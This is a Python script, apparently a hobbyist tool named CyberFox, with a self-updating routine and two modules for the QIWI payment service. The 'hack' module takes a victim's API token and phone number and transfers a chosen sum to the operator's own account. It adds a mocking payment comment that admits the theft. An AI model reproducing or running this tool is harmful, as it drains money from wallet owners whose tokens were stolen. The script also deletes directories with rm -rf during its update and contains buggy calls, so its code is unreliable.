import os
import time
import requests
import sys
from termcolor import colored, cprint
from SimpleQIWI import *
import filecmp

#https://github.com/DarkGa/CyberFox
print(colored("check new version", 'green'))
time.sleep(5)
os.system("mkdir update_check")
os.system("cd update_check")
os.system("git clone https://github.com/DarkGa/CyberFox")
os.system("cp -r $HOME/CyberFox/CyberFox $HOME/CyberFox/update_check")
update = filecmp.cmp('../CyberFox/ver.txt', '../CyberFox/update_check/CyberFox/ver.txt')
os.system("cd")
os.system("cd CyberFox")
os.system("rm -rf update_check")
os.system("rm -rf CyberFox")
print("you use new version!")
print("run CyberFox... ")
time.sleep(3)
if update == False:
	print("Updating")
	time.sleep(3)
	os.system("cp update.py $HOME")
	
	os.system("cd $HOME && python3 update.py")
	
	print("run CyberFox!")
	time.sleep(3)

os.system("clear")
print(colored("$$$$$$\\             $$\\                                 $$$$$$$$\\  $$$$$$\\  $$\\   $$\\", 'green'))
print(colored('$$  __$$\           $$ |                                $$  _____|$$  __$$\ $$ |  $$ |', 'green'))
print(colored('$$ /  \__|$$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$\        $$ |      $$ /  $$ |\$$\ $$  |', 'green'))
print(colored('$$ |      $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\       $$$$$\    $$ |  $$ | \$$$$  / ', 'green'))
print(colored('$$ |      $$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|      $$  __|   $$ |  $$ | $$  $$<  ', 'green'))
print(colored('$$ |  $$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |            $$ |      $$ |  $$ |$$  /\$$\ ', 'green'))
print(colored('\$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$\ $$ |            $$ |       $$$$$$  |$$ /  $$ |', 'green'))
print(colored(' \______/  \____$$ |\_______/  \_______|\__|            \__|       \______/ \__|  \__|', 'green'))
print(colored('          $$\   $$ |                                                                  ', 'green'))
print(colored('          \$$$$$$  |                                                                  ', 'green'))
print(colored('           \______/                                                                    ', 'green'))
print('')
print('')
time.sleep(5)

print(colored("==hacker by DarkGamer, official group: CyberFox", 'green'))
print(colored("|", 'blue'))
print(colored("==version 0.9", 'green'))
print("")
print("")
print("")
print("")
print("")
print("")
      


text = input(colored('kbf> ', 'red'))
I ="use cheker"
T ="use hack"
G ="show optinals"

if text == G:
	
	print(colored("=  modules:",  'green'))
	print(colored("|", 'blue'))
	print(colored("=  use hack — hack money QIWI", 'red'))
	print(colored("|", 'blue'))
	print(colored("=  use checker — chek money to QIVI", 'red'))
	
	text = input(colored('kbf> ', 'red'))
	
if text == I:
	
	time.sleep(5)

	token=input(colored('cheker modules>>', 'red') + colored('set token: ', 'blue'))

	phone=input(colored('cheker modules>>', 'red') + colored('set phone hack: ', 'blue'));

	api = QApi(token=token, phone=phone)

	print(colored('complete', 'green'))

	print(api.balance)

	input()
	
elif text == T:
	
	print("DarkHacker") 
	
	time.sleep(5)

	token=input(colored('hack modules>>', 'red' + 'set token: ', 'blue'))

	phone=input(colored('hack modules>>', 'red' + 'set phone hack: ', 'blue'));

	api = QApi(token=token, phone=phone)

	print(colored('complete', 'green'))

	print(api.balance)
	
	your_phone=int(input(colored('your phone: ', 'red')))
	
	money=int(input(colored('hack money: ', 'red')))
	
	api.pay(account=your_phone, amount=money, comment='сорри бро, что спиздил твои бабки')

	print(api.balance)

	input()
    
    
    
    
    
